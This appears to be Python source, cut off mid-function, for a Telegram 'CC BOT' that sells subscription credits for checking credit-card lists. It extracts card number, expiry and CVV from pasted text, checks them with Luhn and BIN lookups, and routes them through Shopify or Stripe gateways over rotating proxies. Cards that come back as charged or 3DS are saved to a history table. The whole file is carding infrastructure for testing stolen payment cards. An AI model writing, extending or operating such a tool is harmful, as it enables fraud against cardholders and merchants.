from config import CheckerConfig
import asyncio
import re
import random
import sys
import os
import json
import aiohttp
from curl_cffi.requests import AsyncSession
from loguru import logger
from telegram import Update, Document, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, filters, ContextTypes
import io

# PostgreSQL support
try:
    import psycopg2
    from psycopg2.extras import Json
    HAS_POSTGRES = True
except ImportError:
    HAS_POSTGRES = False

# Setup logger
def setup_logger(script_name: str = "CC BOT") -> None:
    logger.remove()
    logger.level("DEBUG", color="<blue>")
    logger.level("INFO", color="<white>")
    logger.level("SUCCESS", color="<green>")
    logger.level("WARNING", color="<yellow>")
    logger.level("ERROR", color="<red>")
    logger.level("CRITICAL", color="<RED><bold>")

    log_format = (
        "<bold><cyan>[{extra[script]}]</cyan></bold> "
        "- <dim>{time:YYYY-MM-DD HH:mm:ss}</dim> "
        "- <magenta>{line}</magenta> "
        "- <level>{message}</level>"
    )
    logger.configure(extra={"script": script_name})
    logger.add(sys.stdout, level="DEBUG", colorize=True, format=log_format)

setup_logger()
config = CheckerConfig()


def escape_markdown(text: str) -> str:
    """
    Escape special Markdown characters to prevent parsing errors.
    Characters that need escaping: _ * [ ] ( ) ~ ` > # + - = | { } . !
    """
    if not text:
        return ""
    # Characters that need escaping in Telegram Markdown
    escape_chars = ['_', '*', '[', ']', '(', ')', '~', '`', '>', '#', '+', '-', '=', '|', '{', '}', '.', '!']
    result = str(text)
    for char in escape_chars:
        result = result.replace(char, f'\\{char}')
    return result

# Database connection
DATABASE_URL = os.getenv("DATABASE_URL", "")

def get_db_connection():
    """Get PostgreSQL database connection"""
    if not HAS_POSTGRES or not DATABASE_URL:
        return None
    try:
        conn = psycopg2.connect(DATABASE_URL)
        return conn
    except Exception as e:
        logger.error(f"Database connection error: {e}")
        return None

def init_database():
    """Initialize database tables"""
    conn = get_db_connection()
    if not conn:
        logger.warning("No database connection - using in-memory storage")
        return False

    try:
        cur = conn.cursor()
        # Create base table
        cur.execute("""
            CREATE TABLE IF NOT EXISTS user_settings (
                user_id BIGINT PRIMARY KEY,
                proxy TEXT,
                products TEXT[],
                email TEXT,
                is_shippable BOOLEAN DEFAULT FALSE,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        """)

        # Add credit/subscription columns if they don't exist
        # credits - current credits available
        cur.execute("""
            DO $$
            BEGIN
                IF NOT EXISTS (SELECT 1 FROM information_schema.columns
                               WHERE table_name='user_settings' AND column_name='credits') THEN
                    ALTER TABLE user_settings ADD COLUMN credits INTEGER DEFAULT 0;
                END IF;
            END $$;
        """)

        # subscription_tier - free, basic, premium, unlimited
        cur.execute("""
            DO $$
            BEGIN
                IF NOT EXISTS (SELECT 1 FROM information_schema.columns
                               WHERE table_name='user_settings' AND column_name='subscription_tier') THEN
                    ALTER TABLE user_settings ADD COLUMN subscription_tier TEXT DEFAULT 'free';
                END IF;
            END $$;
        """)

        # subscription_expires - when subscription expires
        cur.execute("""
            DO $$
            BEGIN
                IF NOT EXISTS (SELECT 1 FROM information_schema.columns
                               WHERE table_name='user_settings' AND column_name='subscription_expires') THEN
                    ALTER TABLE user_settings ADD COLUMN subscription_expires TIMESTAMP;
                END IF;
            END $$;
        """)

        # total_checks_used - lifetime card checks counter
        cur.execute("""
            DO $$
            BEGIN
                IF NOT EXISTS (SELECT 1 FROM information_schema.columns
                               WHERE table_name='user_settings' AND column_name='total_checks_used') THEN
                    ALTER TABLE user_settings ADD COLUMN total_checks_used INTEGER DEFAULT 0;
                END IF;
            END $$;
        """)

        # last_credit_reset - when credits were last reset (for daily reset)
        cur.execute("""
            DO $$
            BEGIN
                IF NOT EXISTS (SELECT 1 FROM information_schema.columns
                               WHERE table_name='user_settings' AND column_name='last_credit_reset') THEN
                    ALTER TABLE user_settings ADD COLUMN last_credit_reset DATE DEFAULT CURRENT_DATE;
                END IF;
            END $$;
        """)

        # gateway - card checking gateway (autoshopify, stripe)
        cur.execute("""
            DO $$
            BEGIN
                IF NOT EXISTS (SELECT 1 FROM information_schema.columns
                               WHERE table_name='user_settings' AND column_name='gateway') THEN
                    ALTER TABLE user_settings ADD COLUMN gateway TEXT DEFAULT 'autoshopify';
                END IF;
            END $$;
        """)

        # Create card_history table for storing charged/3DS cards
        cur.execute("""
            CREATE TABLE IF NOT EXISTS card_history (
                id SERIAL PRIMARY KEY,
                user_id BIGINT NOT NULL,
                username TEXT,
                card TEXT NOT NULL,
                card_type TEXT NOT NULL,
                response_message TEXT,
                gateway_message TEXT,
                bin_info TEXT,
                found_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        """)

        # Create index for faster lookups by user_id and card_type
        cur.execute("""
            CREATE INDEX IF NOT EXISTS idx_card_history_user_type
            ON card_history (user_id, card_type)
        """)

        # Create system_stats table for persistent bot statistics
        cur.execute("""
            CREATE TABLE IF NOT EXISTS system_stats (
                key TEXT PRIMARY KEY,
                value TEXT NOT NULL,
                updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        """)

        # Create banned_users table
        cur.execute("""
            CREATE TABLE IF NOT EXISTS banned_users (
                user_id BIGINT PRIMARY KEY,
                banned_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        """)

        conn.commit()
        cur.close()
        conn.close()
        logger.info("Database initialized successfully with credit/subscription columns, card_history, and system_stats tables")
        return True
    except Exception as e:
        logger.error(f"Database init error: {e}")
        return False

# In-memory fallback
user_settings_cache = {}

# Subscription tier credit limits (per day)
TIER_CREDITS = {
    "free": 10,
    "basic": 100,
    "premium": 500,
    "unlimited": -1,  # -1 means unlimited
}

TIER_NAMES = {
    "free": "🆓 Free",
    "basic": "⭐ Basic",
    "premium": "💎 Premium",
    "unlimited": "👑 Unlimited",
}

def get_default_settings() -> dict:
    """Return default settings for a new user"""
    return {
        "proxy": None,
        "products": [],
        "email": None,
        "is_shippable": False,
        "credits": TIER_CREDITS["free"],  # Start with free tier credits
        "subscription_tier": "free",
        "subscription_expires": None,
        "total_checks_used": 0,
        "last_credit_reset": None,
        "gateway": "autoshopify",
    }

def get_user_settings(user_id: int) -> dict:
    """Get or create user settings from database or cache"""
    # Try database first
    conn = get_db_connection()
    if conn:
        try:
            cur = conn.cursor()
            cur.execute(
                """SELECT proxy, products, email, is_shippable,
                          credits, subscription_tier, subscription_expires,
                          total_checks_used, last_credit_reset, gateway
                   FROM user_settings WHERE user_id = %s""",
                (user_id,)
            )
            row = cur.fetchone()
            cur.close()
            conn.close()

            if row:
                # Parse proxy - handle JSON list, string list representation, or single string
                proxy_raw = row[0]
                if proxy_raw:
                    if isinstance(proxy_raw, list):
                        proxy = proxy_raw
                    elif proxy_raw.startswith('['):
                        # JSON or string representation of list
                        try:
                            proxy = json.loads(proxy_raw)
                        except:
                            # Try ast.literal_eval for Python list string repr
                            import ast
                            try:
                                proxy = ast.literal_eval(proxy_raw)
                            except:
                                proxy = proxy_raw  # fallback to string
                    else:
                        proxy = proxy_raw  # Single proxy string
                else:
                    proxy = None

                return {
                    "proxy": proxy,
                    "products": row[1] if row[1] else [],
                    "email": row[2],
                    "is_shippable": row[3],
                    "credits": row[4] if row[4] is not None else TIER_CREDITS["free"],
                    "subscription_tier": row[5] or "free",
                    "subscription_expires": row[6],
                    "total_checks_used": row[7] or 0,
                    "last_credit_reset": row[8],
                    "gateway": row[9] or "autoshopify",
                }
            else:
                # Create new user settings with default credits
                return save_user_settings(user_id, get_default_settings())
        except Exception as e:
            logger.error(f"Database read error: {e}")

    # Fallback to in-memory
    if user_id not in user_settings_cache:
        user_settings_cache[user_id] = get_default_settings()
    return user_settings_cache[user_id]

def save_user_settings(user_id: int, settings: dict) -> dict:
    """Save user settings to database"""
    conn = get_db_connection()
    if conn:
        try:
            # Serialize proxy to JSON if it's a list
            proxy_value = settings.get("proxy")
            if isinstance(proxy_value, list):
                proxy_value = json.dumps(proxy_value)

            cur = conn.cursor()
            cur.execute("""
                INSERT INTO user_settings (user_id, proxy, products, email, is_shippable,
                                           credits, subscription_tier, subscription_expires,
                                           total_checks_used, last_credit_reset, gateway, updated_at)
                VALUES (%s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, CURRENT_TIMESTAMP)
                ON CONFLICT (user_id) DO UPDATE SET
                    proxy = EXCLUDED.proxy,
                    products = EXCLUDED.products,
                    email = EXCLUDED.email,
                    is_shippable = EXCLUDED.is_shippable,
                    credits = EXCLUDED.credits,
                    subscription_tier = EXCLUDED.subscription_tier,
                    subscription_expires = EXCLUDED.subscription_expires,
                    total_checks_used = EXCLUDED.total_checks_used,
                    last_credit_reset = EXCLUDED.last_credit_reset,
                    gateway = EXCLUDED.gateway,
                    updated_at = CURRENT_TIMESTAMP
            """, (
                user_id,
                proxy_value,
                settings.get("products", []),
                settings.get("email"),
                settings.get("is_shippable", False),
                settings.get("credits", 0),
                settings.get("subscription_tier", "free"),
                settings.get("subscription_expires"),
                settings.get("total_checks_used", 0),
                settings.get("last_credit_reset"),
                settings.get("gateway", "autoshopify"),
            ))
            conn.commit()
            cur.close()
            conn.close()
            logger.debug(f"Saved settings for user {user_id}")
        except Exception as e:
            logger.error(f"Database save error: {e}")

    # Also update cache
    user_settings_cache[user_id] = settings
    return settings

def update_user_setting(user_id: int, key: str, value) -> dict:
    """Update a single setting for a user"""
    settings = get_user_settings(user_id)
    settings[key] = value
    return save_user_settings(user_id, settings)


# =============================================================================
# CARD HISTORY - Store charged/3DS cards
# =============================================================================

def save_card_history(user_id: int, username: str, card: str, card_type: str,
                      response_message: str = None, gateway_message: str = None, bin_info: str = None):
    """
    Save a charged or 3DS card to history.
    card_type should be 'charged' or '3ds'
    """
    conn = get_db_connection()
    if conn:
        try:
            cur = conn.cursor()
            cur.execute("""
                INSERT INTO card_history (user_id, username, card, card_type, response_message, gateway_message, bin_info)
                VALUES (%s, %s, %s, %s, %s, %s, %s)
            """, (user_id, username, card, card_type, response_message, gateway_message, bin_info))
            conn.commit()
            cur.close()
            conn.close()
            logger.debug(f"Saved {card_type} card to history for user {user_id}")
            return True
        except Exception as e:
            logger.error(f"Failed to save card history: {e}")
            return False
    return False


def get_card_history(user_id: int = None, card_type: str = None, limit: int = 100) -> list:
    """
    Get card history from database.
    - If user_id is None, returns all cards (admin use)
    - If card_type is None, returns both charged and 3DS
    - Returns list of dicts with card info
    """
    conn = get_db_connection()
    if conn:
        try:
            cur = conn.cursor()

            # Build query based on filters
            query = "SELECT user_id, username, card, card_type, response_message, gateway_message, bin_info, found_at FROM card_history"
            conditions = []
            params = []

            if user_id is not None:
                conditions.append("user_id = %s")
                params.append(user_id)

            if card_type is not None:
                conditions.append("card_type = %s")
                params.append(card_type)

            if conditions:
                query += " WHERE " + " AND ".join(conditions)

            query += " ORDER BY found_at DESC LIMIT %s"
            params.append(limit)

            cur.execute(query, tuple(params))
            rows = cur.fetchall()
            cur.close()
            conn.close()

            return [
                {
                    "user_id": row[0],
                    "username": row[1],
                    "card": row[2],
                    "card_type": row[3],
                    "response_message": row[4],
                    "gateway_message": row[5],
                    "bin_info": row[6],
                    "found_at": row[7],
                }
                for row in rows
            ]
        except Exception as e:
            logger.error(f"Failed to get card history: {e}")
            return []
    return []


def get_card_history_count(user_id: int = None, card_type: str = None) -> int:
    """Get count of cards in history"""
    conn = get_db_connection()
    if conn:
        try:
            cur = conn.cursor()
            query = "SELECT COUNT(*) FROM card_history"
            conditions = []
            params = []

            if user_id is not None:
                conditions.append("user_id = %s")
                params.append(user_id)

            if card_type is not None:
                conditions.append("card_type = %s")
                params.append(card_type)

            if conditions:
                query += " WHERE " + " AND ".join(conditions)

            cur.execute(query, tuple(params))
            count = cur.fetchone()[0]
            cur.close()
            conn.close()
            return count
        except Exception as e:
            logger.error(f"Failed to get card history count: {e}")
            return 0
    return 0


# =============================================================================
# CREDIT & SUBSCRIPTION SYSTEM
# =============================================================================

from datetime import datetime, timedelta, date, timezone


def make_aware(dt):
    """Convert naive datetime to UTC aware datetime"""
    if dt is None:
        return None
    if isinstance(dt, datetime):
        if dt.tzinfo is None:
            return dt.replace(tzinfo=timezone.utc)
        return dt
    return dt


def check_and_reset_daily_credits(user_id: int) -> dict:
    """Check if credits need to be reset (daily reset at midnight UTC) and reset if needed"""
    settings = get_user_settings(user_id)
    tier = settings.get("subscription_tier", "free")
    last_reset = settings.get("last_credit_reset")
    today = date.today()

    # Check if subscription has expired
    expires = settings.get("subscription_expires")
    expires_aware = make_aware(expires)
    if expires_aware and isinstance(expires_aware, datetime) and expires_aware < datetime.now(timezone.utc):
        # Subscription expired, downgrade to free
        tier = "free"
        settings["subscription_tier"] = tier
        settings["subscription_expires"] = None
        logger.info(f"User {user_id} subscription expired, downgraded to free")

    # Check if we need to reset credits (different day or never reset)
    needs_reset = False
    if last_reset is None:
        needs_reset = True
    elif isinstance(last_reset, date):
        needs_reset = last_reset < today
    elif isinstance(last_reset, datetime):
        needs_reset = last_reset.date() < today

    if needs_reset:
        # Reset credits to tier limit
        tier_limit = TIER_CREDITS.get(tier, TIER_CREDITS["free"])
        if tier_limit == -1:  # Unlimited
            settings["credits"] = 999999  # Large number for unlimited
        else:
            settings["credits"] = tier_limit
        settings["last_credit_reset"] = today
        save_user_settings(user_id, settings)
        logger.info(f"Reset credits for user {user_id}: {settings['credits']} credits (tier: {tier})")

    return settings


def get_user_credits(user_id: int) -> int:
    """Get user's current credits after checking for daily reset"""
    settings = check_and_reset_daily_credits(user_id)
    tier = settings.get("subscription_tier", "free")
    if TIER_CREDITS.get(tier, 0) == -1:  # Unlimited
        return -1  # Return -1 to indicate unlimited
    return settings.get("credits", 0)


def has_enough_credits(user_id: int, amount: int = 1) -> bool:
    """Check if user has enough credits for an operation"""
    credits = get_user_credits(user_id)
    if credits == -1:  # Unlimited
        return True
    return credits >= amount


def deduct_credits(user_id: int, amount: int = 1) -> tuple[bool, int]:
    """
    Deduct credits from user. Returns (success, remaining_credits).
    Also increments total_checks_used counter.
    """
    settings = check_and_reset_daily_credits(user_id)
    tier = settings.get("subscription_tier", "free")

    # Unlimited tier - don't deduct, just increment counter
    if TIER_CREDITS.get(tier, 0) == -1:
        settings["total_checks_used"] = settings.get("total_checks_used", 0) + amount
        save_user_settings(user_id, settings)
        return True, -1

    current_credits = settings.get("credits", 0)
    if current_credits < amount:
        return False, current_credits

    settings["credits"] = current_credits - amount
    settings["total_checks_used"] = settings.get("total_checks_used", 0) + amount
    save_user_settings(user_id, settings)
    return True, settings["credits"]


def add_credits(user_id: int, amount: int) -> int:
    """Add credits to a user (admin function). Returns new credit balance."""
    settings = get_user_settings(user_id)
    settings["credits"] = settings.get("credits", 0) + amount
    save_user_settings(user_id, settings)
    return settings["credits"]


def set_subscription(user_id: int, tier: str, days: int = 30) -> dict:
    """Set user's subscription tier and expiration. Returns updated settings."""
    if tier not in TIER_CREDITS:
        tier = "free"

    settings = get_user_settings(user_id)
    settings["subscription_tier"] = tier

    if tier == "free":
        settings["subscription_expires"] = None
    else:
        settings["subscription_expires"] = datetime.now(timezone.utc) + timedelta(days=days)

    # Reset credits to new tier limit
    tier_limit = TIER_CREDITS.get(tier, TIER_CREDITS["free"])
    if tier_limit == -1:
        settings["credits"] = 999999
    else:
        settings["credits"] = tier_limit

    settings["last_credit_reset"] = date.today()
    save_user_settings(user_id, settings)
    logger.info(f"Set subscription for user {user_id}: tier={tier}, days={days}")
    return settings


def get_subscription_info(user_id: int) -> dict:
    """Get detailed subscription info for a user"""
    settings = check_and_reset_daily_credits(user_id)
    tier = settings.get("subscription_tier", "free")
    credits = settings.get("credits", 0)
    tier_limit = TIER_CREDITS.get(tier, TIER_CREDITS["free"])
    expires = settings.get("subscription_expires")
    total_used = settings.get("total_checks_used", 0)

    # Calculate days until expiration
    days_left = None
    if expires:
        if isinstance(expires, datetime):
            expires_aware = make_aware(expires)
            delta = expires_aware - datetime.now(timezone.utc)
            days_left = max(0, delta.days)
        else:
            days_left = 0

    return {
        "tier": tier,
        "tier_name": TIER_NAMES.get(tier, "Unknown"),
        "credits": credits if tier_limit != -1 else "Unlimited",
        "daily_limit": tier_limit if tier_limit != -1 else "Unlimited",
        "expires": expires,
        "days_left": days_left,
        "total_checks_used": total_used,
        "is_unlimited": tier_limit == -1,
    }


def get_no_credits_message() -> str:
    """Get the message to show when user has no credits"""
    return (
        "❌ *No Credits Remaining!*\n\n"
        "You've used all your daily credits.\n\n"
        "🔄 Credits reset daily at midnight UTC\n\n"
        "💎 *Upgrade for more credits:*\n"
        "• Basic: 100 credits/day\n"
        "• Premium: 500 credits/day\n"
        "• Unlimited: No limits!\n\n"
        "Use /subscribe to view plans"
    )


async def check_and_send_credit_notifications(user_id: int, remaining_credits: int):
    """Check if user needs credit notifications and send them"""
    global _bot_app

    if remaining_credits == -1:  # Unlimited
        return

    try:
        if _bot_app is None:
            return

        if remaining_credits == 10:
            await _bot_app.bot.send_message(
                chat_id=user_id,
                text=(
                    "⚠️ *Low Credits Warning!*\n\n"
                    "You have only *10 credits* remaining today.\n\n"
                    "💎 Upgrade to get more credits:\n"
                    "Use /subscribe to view plans"
                ),
                parse_mode="Markdown"
            )
        elif remaining_credits == 0:
            await _bot_app.bot.send_message(
                chat_id=user_id,
                text=get_no_credits_message(),
                parse_mode="Markdown"
            )
    except Exception as e:
        logger.error(f"Error sending credit notification to {user_id}: {e}")


async def check_subscription_expiry_notifications():
    """Check all users for expiring subscriptions and send notifications"""
    global _bot_app

    if _bot_app is None or not DATABASE_URL:
        return

    conn = get_db_connection()
    if not conn:
        return

    try:
        cur = conn.cursor()
        # Find users whose subscription expires in 3 days
        cur.execute("""
            SELECT user_id, subscription_tier, subscription_expires
            FROM user_settings
            WHERE subscription_expires IS NOT NULL
            AND subscription_expires > NOW()
            AND subscription_expires <= NOW() + INTERVAL '3 days'
            AND subscription_tier != 'free'
        """)

        expiring_users = cur.fetchall()
        cur.close()
        conn.close()

        for row in expiring_users:
            user_id, tier, expires = row
            expires_aware = make_aware(expires)
            days_left = (expires_aware - datetime.now(timezone.utc)).days
            tier_name = TIER_NAMES.get(tier, tier)

            try:
                await _bot_app.bot.send_message(
                    chat_id=user_id,
                    text=(
                        f"⏰ *Subscription Expiring Soon!*\n\n"
                        f"Your {tier_name} subscription expires in *{days_left} days*.\n\n"
                        f"Contact admin to renew your subscription."
                    ),
                    parse_mode="Markdown"
                )
            except Exception as e:
                logger.error(f"Error sending expiry notification to {user_id}: {e}")

    except Exception as e:
        logger.error(f"Error checking subscription expiry: {e}")


# Session state management for pause/stop and input waiting
user_sessions = {}

def get_user_session(user_id: int) -> dict:
    """Get or create a user's checking session state"""
    if user_id not in user_sessions:
        user_sessions[user_id] = {
            "paused": False,
            "stopped": False,
            "checking": False,
            "waiting_for": None  # None, "proxy"
        }
    return user_sessions[user_id]

def reset_user_session(user_id: int):
    """Reset a user's session state"""
    user_sessions[user_id] = {
        "paused": False,
        "stopped": False,
        "checking": False,
        "waiting_for": None
    }

def set_waiting_for(user_id: int, waiting_type: str):
    """Set what input the bot is waiting for from user"""
    session = get_user_session(user_id)
    session["waiting_for"] = waiting_type

def get_waiting_for(user_id: int) -> str:
    """Get what input the bot is waiting for"""
    session = get_user_session(user_id)
    return session.get("waiting_for")


# =============================================================================
# GLOBAL STATS TRACKING (PERSISTENT)
# =============================================================================
import time as _time

# Bot statistics (loaded from database on startup)
bot_stats = {
    "start_time": _time.time(),
    "total_cards_checked": 0,
    "total_charged": 0,
    "total_declined": 0,
    "total_3ds": 0,
    "banned_users": set(),  # Set of banned user IDs
}

def load_stats_from_db():
    """Load bot statistics from database"""
    conn = get_db_connection()
    if conn:
        try:
            cur = conn.cursor()
            # Load numeric stats
            cur.execute("SELECT key, value FROM system_stats WHERE key IN ('total_cards_checked', 'total_charged', 'total_declined', 'total_3ds')")
            for row in cur.fetchall():
                key, value = row
                try:
                    bot_stats[key] = int(value)
                except:
                    pass

            # Load banned users
            cur.execute("SELECT user_id FROM banned_users")
            bot_stats["banned_users"] = set(row[0] for row in cur.fetchall())

            cur.close()
            conn.close()
            logger.info(f"Loaded stats from DB: checked={bot_stats['total_cards_checked']}, charged={bot_stats['total_charged']}, declined={bot_stats['total_declined']}, 3ds={bot_stats['total_3ds']}, banned={len(bot_stats['banned_users'])}")
        except Exception as e:
            logger.error(f"Error loading stats from DB: {e}")
            if conn:
                conn.close()

def save_stat_to_db(stat_name: str, value: int):
    """Save a single stat to database"""
    conn = get_db_connection()
    if conn:
        try:
            cur = conn.cursor()
            cur.execute("""
                INSERT INTO system_stats (key, value, updated_at)
                VALUES (%s, %s, CURRENT_TIMESTAMP)
                ON CONFLICT (key) DO UPDATE SET value = %s, updated_at = CURRENT_TIMESTAMP
            """, (stat_name, str(value), str(value)))
            conn.commit()
            cur.close()
            conn.close()
        except Exception as e:
            logger.error(f"Error saving stat {stat_name}: {e}")
            if conn:
                conn.close()

def increment_stat(stat_name: str, amount: int = 1):
    """Increment a stat counter and persist to database"""
    if stat_name in bot_stats and isinstance(bot_stats[stat_name], int):
        bot_stats[stat_name] += amount
        # Save to database (async-safe since we use separate connections)
        save_stat_to_db(stat_name, bot_stats[stat_name])

def get_uptime() -> str:
    """Get bot uptime as formatted string"""
    elapsed = int(_time.time() - bot_stats["start_time"])
    days = elapsed // 86400
    hours = (elapsed % 86400) // 3600
    minutes = (elapsed % 3600) // 60
    seconds = elapsed % 60

    if days > 0:
        return f"{days}d {hours}h {minutes}m"
    elif hours > 0:
        return f"{hours}h {minutes}m {seconds}s"
    else:
        return f"{minutes}m {seconds}s"

def is_user_banned(user_id: int) -> bool:
    """Check if a user is banned"""
    return user_id in bot_stats["banned_users"]

def ban_user(user_id: int):
    """Ban a user and persist to database"""
    bot_stats["banned_users"].add(user_id)
    conn = get_db_connection()
    if conn:
        try:
            cur = conn.cursor()
            cur.execute("INSERT INTO banned_users (user_id) VALUES (%s) ON CONFLICT DO NOTHING", (user_id,))
            conn.commit()
            cur.close()
            conn.close()
        except Exception as e:
            logger.error(f"Error banning user {user_id}: {e}")
            if conn:
                conn.close()

def unban_user(user_id: int):
    """Unban a user and persist to database"""
    bot_stats["banned_users"].discard(user_id)
    conn = get_db_connection()
    if conn:
        try:
            cur = conn.cursor()
            cur.execute("DELETE FROM banned_users WHERE user_id = %s", (user_id,))
            conn.commit()
            cur.close()
            conn.close()
        except Exception as e:
            logger.error(f"Error unbanning user {user_id}: {e}")
            if conn:
                conn.close()


# Round-robin counters for proxies and products (per user)
user_round_robin_counters = {}

def get_next_item_round_robin(user_id: int, item_type: str, items: list):
    """Get next item using round-robin for a user's proxies or products"""
    if not items:
        return None

    key = f"{user_id}_{item_type}"
    if key not in user_round_robin_counters:
        user_round_robin_counters[key] = 0

    idx = user_round_robin_counters[key] % len(items)
    user_round_robin_counters[key] += 1
    return items[idx]


def create_lista_(text: str):
    """Extract credit card numbers from text"""
    m = re.findall(
        r'\d{15,16}(?:/|:|\|)\d+(?:/|:|\|)\d{2,4}(?:/|:|\|)\d{3,4}', text)
    lis = list(filter(lambda num: num.startswith(
        ("5", "6", "3", "4")), [*set(m)]))
    return [xx.replace("/", "|").replace(":", "|") for xx in lis]


# =============================================================================
# CARD VALIDATION - Accuracy Improvements
# =============================================================================

def luhn_check(card_number: str) -> bool:
    """
    Validate card number using Luhn algorithm (mod 10 checksum).
    Returns True if valid, False if invalid.
    """
    try:
        # Remove any non-digit characters
        digits = ''.join(filter(str.isdigit, card_number))

        if len(digits) < 13 or len(digits) > 19:
            return False

        # Luhn algorithm
        total = 0
        reverse_digits = digits[::-1]

        for i, digit in enumerate(reverse_digits):
            n = int(digit)
            if i % 2 == 1:  # Double every second digit
                n *= 2
                if n > 9:
                    n -= 9
            total += n

        return total % 10 == 0
    except Exception:
        return False


def validate_expiry(month: str, year: str) -> tuple:
    """
    Validate card expiry date using REAL-TIME system date.
    Returns (is_valid: bool, error_message: str or None)

    Note: Uses UTC time for consistency across timezones.
    Cards are valid through the END of their expiry month.
    """
    try:
        from datetime import datetime, timezone

        month_int = int(month)

        # Handle 2-digit or 4-digit year
        year_str = year.strip()
        if len(year_str) == 2:
            year_int = 2000 + int(year_str)
        elif len(year_str) == 4:
            year_int = int(year_str)
        else:
            return False, "Invalid year format"

        # Validate month range
        if month_int < 1 or month_int > 12:
            return False, f"Invalid month: {month}"

        # Get REAL-TIME current date in UTC for consistency
        # Using UTC avoids timezone issues across different server locations
        now = datetime.now(timezone.utc)
        current_year = now.year
        current_month = now.month

        # Check if expired
        # Card is valid through the END of the expiry month
        # So a card expiring 12/2024 is valid until Dec 31, 2024
        if year_int < current_year:
            return False, f"Card expired ({month_int:02d}/{year_int})"
        elif year_int == current_year and month_int < current_month:
            return False, f"Card expired ({month_int:02d}/{year_int})"

        # Check if too far in future (more than 20 years)
        if year_int > current_year + 20:
            return False, "Invalid expiry year (too far in future)"

        return True, None
    except ValueError:
        return False, "Invalid expiry format"


def validate_cvv(cvv: str, card_number: str = None) -> tuple:
    """
    Validate CVV format.
    Returns (is_valid: bool, error_message: str or None)
    """
    try:
        # Remove any spaces
        cvv = cvv.strip()

        # Check if all digits
        if not cvv.isdigit():
            return False, "CVV must be numeric"

        # Check length (3 for Visa/MC, 4 for Amex)
        if card_number and card_number.startswith('3'):  # Amex
            if len(cvv) != 4:
                return False, "Amex CVV must be 4 digits"
        else:
            if len(cvv) not in [3, 4]:
                return False, "CVV must be 3-4 digits"

        return True, None
    except Exception:
        return False, "Invalid CVV"


def validate_card_full(card: str) -> tuple:
    """
    Full card validation before API call.
    Returns (is_valid: bool, error_message: str or None, parsed_data: dict or None)

    Validates:
    - Card number (Luhn check)
    - Expiry date (not expired, valid format)
    - CVV (correct format/length)
    """
    try:
        # Parse card string
        parts = card.replace(":", "|").replace("/", "|").split("|")

        if len(parts) != 4:
            return False, "Invalid card format (need: number|mm|yy|cvv)", None

        card_number, month, year, cvv = parts
        card_number = card_number.strip()
        month = month.strip().zfill(2)  # Pad month to 2 digits
        year = year.strip()
        cvv = cvv.strip()

        # Validate card number with Luhn
        if not luhn_check(card_number):
            return False, "Invalid card number (failed Luhn check)", None

        # Validate expiry
        expiry_valid, expiry_error = validate_expiry(month, year)
        if not expiry_valid:
            return False, expiry_error, None

        # Validate CVV
        cvv_valid, cvv_error = validate_cvv(cvv, card_number)
        if not cvv_valid:
            return False, cvv_error, None

        # All validations passed
        return True, None, {
            "number": card_number,
            "month": month,
            "year": year if len(year) == 4 else f"20{year}",
            "cvv": cvv
        }

    except Exception as e:
        return False, f"Validation error: {str(e)}", None


# BIN (Bank Identification Number) validation cache
_bin_cache = {}

async def validate_bin(card_number: str) -> tuple:
    """
    Validate BIN (first 6 digits) using lookup API.
    Returns (is_valid: bool, bin_data: dict or None, error: str or None)

    Caches results to avoid repeated API calls.
    """
    try:
        bin_prefix = card_number[:6]

        # Check cache first
        if bin_prefix in _bin_cache:
            cached = _bin_cache[bin_prefix]
            if cached.get("valid"):
                return True, cached.get("data"), None
            else:
                return False, None, cached.get("error")

        # BIN lookup API
        async with aiohttp.ClientSession() as session:
            try:
                async with session.get(
                    f"https://lookup.binlist.net/{bin_prefix}",
                    headers={"Accept-Version": "3"},
                    timeout=aiohttp.ClientTimeout(total=5)
                ) as response:
                    if response.status == 200:
                        data = await response.json()
                        bin_data = {
                            "scheme": data.get("scheme", "").upper(),  # VISA, MASTERCARD, etc.
                            "type": data.get("type", "").upper(),  # DEBIT, CREDIT
                            "brand": data.get("brand", ""),
                            "country": data.get("country", {}).get("name", "Unknown"),
                            "bank": data.get("bank", {}).get("name", "Unknown"),
                            "prepaid": data.get("prepaid", False)
                        }
                        _bin_cache[bin_prefix] = {"valid": True, "data": bin_data}
                        return True, bin_data, None
                    elif response.status == 404:
                        _bin_cache[bin_prefix] = {"valid": False, "error": "Unknown BIN"}
                        return False, None, "Unknown BIN"
                    else:
                        # Don't cache errors - might be rate limited
                        return True, None, None  # Allow card to proceed
            except asyncio.TimeoutError:
                return True, None, None  # Allow on timeout
            except Exception:
                return True, None, None  # Allow on error

    except Exception as e:
        return True, None, None  # Allow on any error


# Proxy health check cache
_proxy_health_cache = {}
_proxy_health_ttl = 300  # 5 minutes cache

def parse_proxy_format(proxy: str) -> tuple:
    """
    Parse proxy string in various formats and return (is_valid, proxy_url, error_message).

    Supported formats:
    - host:port
    - host:port:username:password
    - http://host:port
    - http://user:pass@host:port

    Returns:
        (is_valid: bool, proxy_url: str or None, error_message: str or None)
    """
    proxy = proxy.strip()

    if not proxy:
        return False, None, "Empty proxy"

    # If already in URL format
    if proxy.startswith(('http://', 'https://')):
        return True, proxy, None

    # Parse host:port or host:port:user:pass format
    parts = proxy.split(":")

    if len(parts) == 2:
        # host:port format
        host, port = parts
        if not host or not port.isdigit():
            return False, None, "Invalid format. Use: host:port or host:port:user:pass"
        return True, f"http://{host}:{port}", None

    elif len(parts) == 4:
        # host:port:username:password format
        host, port, username, password = parts
        if not host or not port.isdigit() or not username or not password:
            return False, None, "Invalid format. Use: host:port:user:pass"
        return True, f"http://{username}:{password}@{host}:{port}", None

    else:
        return False, None, "Invalid format. Use: host:port or host:port:user:pass"


async def check_proxy_health(proxy: str, skip_cache: bool = False) -> tuple:
    """
    Check if a proxy is working.
    Caches results for 5 minutes to avoid repeated checks.

    Args:
        proxy: Proxy string in any format (host:port:user:pass or URL format)
        skip_cache: If True, always perform a fresh check

    Returns:
        (is_healthy: bool, error_message: str or None)
    """
    if not proxy:
        return True, None  # No proxy = direct connection

    # Parse proxy format
    is_valid, proxy_url, error = parse_proxy_format(proxy)
    if not is_valid:
        return False, error

    try:
        import time
        current_time = time.time()

        # Check cache (unless skip_cache is True)
